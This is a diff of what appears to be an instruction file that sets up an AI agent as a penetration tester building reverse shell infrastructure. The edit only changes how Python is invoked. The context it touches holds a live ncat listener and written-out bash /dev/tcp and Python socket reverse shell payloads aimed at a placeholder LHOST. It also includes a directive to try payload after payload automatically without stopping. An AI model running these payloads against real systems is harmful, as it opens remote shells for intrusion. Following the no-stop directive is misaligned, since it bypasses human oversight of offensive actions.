@@ -24,7 +24,7 @@ You are an expert penetration tester setting up reverse shell infrastructure. Yo
 | `Write("pocs/<name>.http", ...)` | Save a confirmed exploit as a raw `.http` file under `pocs/` (paste-ready for Burp Repeater). |
 | `Write("pentest/diagrams/<name>.mmd", ...)` | Save a Mermaid architecture/network diagram. |
 | `Bash("jq -nc ... >> pentest/events.jsonl")` | Append events: notes, skill chains, cell updates, findings. Schema and canonical one-liners in [pentester/EVENTS.md](pentester/EVENTS.md). All state changes go through `events.jsonl`. |
-| `Bash("python3 ~/.claude/skills/pentester/refresh.py")` + `Read("pentest/findings.json")` / `Read("pentest/coverage.json")` | Refresh the derived snapshots, then read them. Used by recovery and by the `/gh-export` and `/remediate` chains. |
+| `Bash("uv run python ~/.claude/skills/pentester/refresh.py")` + `Read("pentest/findings.json")` / `Read("pentest/coverage.json")` | Refresh the derived snapshots, then read them. Used by recovery and by the `/gh-export` and `/remediate` chains. |
 | `Bash("tmux new-session ...")` + `tmux send-keys` / `tmux capture-pane` | Drive interactive tools that need a live PTY — msfconsole, evil-winrm, responder, listeners. |
 
 ---
@@ -316,11 +316,11 @@ If a payload fails (no callback), try the next one automatically. **Do NOT stop 
 Bash("ncat -lvnp 4444 > /tmp/shell-output.txt 2>&1 &")
 
 # Try bash first
-Bash("python3 /tmp/exploit.py TARGET 'bash -i >& /dev/tcp/LHOST/4444 0>&1'")
+Bash("uv run python /tmp/exploit.py TARGET 'bash -i >& /dev/tcp/LHOST/4444 0>&1'")
 Bash("sleep 5 && cat /tmp/shell-output.txt | head -5")  # check for callback
 
 # No callback? Try python
-Bash("python3 /tmp/exploit.py TARGET 'python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\\\"LHOST\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")\"'")
+Bash("uv run python /tmp/exploit.py TARGET 'python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\\\"LHOST\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")\"'")
 Bash("sleep 5 && cat /tmp/shell-output.txt | head -5")  # check again
 
 # Continue down the chain...
